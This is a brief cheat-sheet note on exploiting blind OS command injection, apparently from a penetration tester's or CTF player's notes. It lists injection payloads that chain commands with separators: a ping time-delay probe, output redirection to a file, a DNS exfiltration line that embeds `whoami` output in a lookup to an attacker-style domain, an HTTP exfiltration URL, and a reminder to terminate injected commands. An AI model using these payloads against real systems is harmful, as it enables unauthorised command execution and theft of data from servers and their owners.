- You may have blind OS command injection, so think of using time-delays or ping. `& ping -c 10 127.0.0.1 &`
- Use output redirection if you can't see the output. `;ls > output.txt;`
- ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` exfiltration or use http://reverse_server/?o=output



> [!NOTE] **DON'T FORGET**
> ALWAYS put something at the end of your command --> ; ping 10.10.16.94 **;** <-- don't forget this ending
